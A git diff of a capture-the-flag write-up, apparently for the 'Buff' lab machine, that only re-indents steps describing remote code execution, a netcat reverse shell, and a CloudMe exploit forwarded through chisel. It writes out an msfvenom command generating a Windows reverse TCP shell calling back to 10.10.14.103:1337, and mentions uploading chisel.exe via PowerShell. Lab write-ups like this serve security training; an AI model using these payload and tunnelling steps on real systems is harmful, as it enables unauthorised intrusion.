@@ -63,7 +63,7 @@ By running the exploit providing the box ip we get RCE on the box. The shell tha
 
 ![](../../.gitbook/assets/buff-nc.png)
 
-2. Executing `nc` and getting a responsive reverse shell
+ 2. Executing `nc` and getting a responsive reverse shell
 
 ![](../../.gitbook/assets/buff-rce.png)
 
@@ -79,15 +79,15 @@ After some manual enumeration on the use we can see an app that stick out `Cloud
 
 Since python is not installed in the victim box we can use port forwarding to execute the script locally and send the payload to the victim using chisel. First we have to create a payload that opens a reverse TCP connection back to us. To do that we can use msfvenom and then use that created payload in the python script that we found.
 
-1. To create the payload `sudo msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.14.103 LPORT=1337 -f py -v payload`
+ 1. To create the payload `sudo msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.14.103 LPORT=1337 -f py -v payload`
 
 Our next move is to upload `chisel.exe` on the victim using `powershell IWR` and run it in client mode , open chisel locally in server mode on the same ports to get a connection from our machine to the victim machine and finally forward the payload to the port that the app is running.
 
-2. Locally open chisel in server mode
+ 2. Locally open chisel in server mode
 
 ![](../../.gitbook/assets/buff-client-chisel.png)
 
-3. Remotely execute chisel in client mode
+ 3. Remotely execute chisel in client mode
 
 ![](../../.gitbook/assets/buff-serverchisel.png)
 
